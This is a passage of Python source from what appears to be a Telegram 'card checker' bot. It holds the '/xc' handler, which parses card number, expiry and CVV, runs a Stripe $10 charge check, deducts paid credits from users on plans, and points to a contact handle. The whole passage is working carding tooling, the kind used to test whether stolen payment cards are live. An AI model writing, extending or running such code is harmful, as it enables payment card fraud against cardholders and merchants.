        # Check cooldown (owner is automatically skipped in check_cooldown function)
        can_use, wait_time = check_cooldown(user_id, "xc")
        if not can_use:
            await message.reply(f"""<pre>⏳ Cooldown Active</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: Please wait {wait_time:.1f} seconds before using this command again.
⟐ <b>Your Plan:</b> <code>{plan_name}</code>
⟐ <b>Anti-Spam:</b> <code>{user_plan.get('antispam', 15)}s</code>
━━━━━━━━━━━━━""")
            return

        # Check command arguments
        args = message.text.split()
        if len(args) < 2:
            # Use charge_processor for usage message if available
            if CREDIT_SYSTEM_AVAILABLE and charge_processor:
                usage_msg = charge_processor.get_usage_message(
                    command_name="xc",
                    gateway_name="Stripe Charge 10$",
                    example_card="4111111111111111|12|2025|123"
                )
                await message.reply(usage_msg)
            else:
                await message.reply("""<pre>#WAYNE ─[STRIPE CHARGE]─</pre>
━━━━━━━━━━━━━
⟐ <b>Command</b>: <code>/xc</code> or <code>.xc</code> or <code>$xc</code>
⟐ <b>Usage</b>: <code>/xc cc|mm|yy|cvv</code>
⟐ <b>Example</b>: <code>/xc 4111111111111111|12|2025|123</code>
⟐ <b>Gate</b>: Stripe Charge 10$ ♻️
━━━━━━━━━━━━━
<b>~ Note:</b> <code>Tests card with $10 charge via Stripe (Deducts 2 credits)</code>
<b>~ Note:</b> <code>Credits are ONLY deducted when check actually runs and completes</code>
<b>~ Note:</b> <code>If check fails to start, NO credits are deducted</code>""")
            return

        card_details = args[1].strip()

        cc_parts = card_details.split('|')
        if len(cc_parts) < 4:
            await message.reply("""<pre>❌ Invalid Format</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: Invalid card format.
⟐ <b>Correct Format</b>: <code>cc|mm|yy|cvv</code>
⟐ <b>Example</b>: <code>4111111111111111|12|2025|123</code>
━━━━━━━━━━━━━""")
            return

        cc = cc_parts[0]
        mes = cc_parts[1]
        ano = cc_parts[2]
        cvv = cc_parts[3]

        # Create checker instance
        checker = StripeChargeChecker()

        # Get processing message using charge_processor if available
        if CREDIT_SYSTEM_AVAILABLE and charge_processor:
            processing_msg = charge_processor.get_processing_message(
                cc=cc,
                mes=mes,
                ano=ano,
                cvv=cvv,
                username=username,
                user_plan=plan_name,
                gateway_name="Stripe Charge 10$",
                command_name="xc"
            )
        else:
            processing_msg = checker.get_processing_message(cc, mes, ano, cvv, username, plan_name)

        processing_msg_obj = await message.reply(processing_msg)

        # Use universal charge processor if available
        if CREDIT_SYSTEM_AVAILABLE and charge_processor:
            # CORRECTED: Pass arguments in correct order for execute_charge_command
            success, result, credits_deducted = await charge_processor.execute_charge_command(
                user_id,                    # positional: user_id
                checker.check_card,         # positional: check_callback
                card_details, username, user_data,  # positional: *check_args
                credits_needed=2,
                command_name="xc",
                gateway_name="Stripe Charge 10$"
            )

            await processing_msg_obj.edit_text(result, disable_web_page_preview=True)
        else:
            # Fallback to old method if charge_processor not available
            result = await checker.check_card(card_details, username, user_data)
            await processing_msg_obj.edit_text(result, disable_web_page_preview=True)

    except Exception as e:
        error_msg = str(e)[:150]
        await message.reply(f"""<pre>❌ Command Error</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: An error occurred while processing your request.
⟐ <b>Error</b>: <code>{error_msg}</code>
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
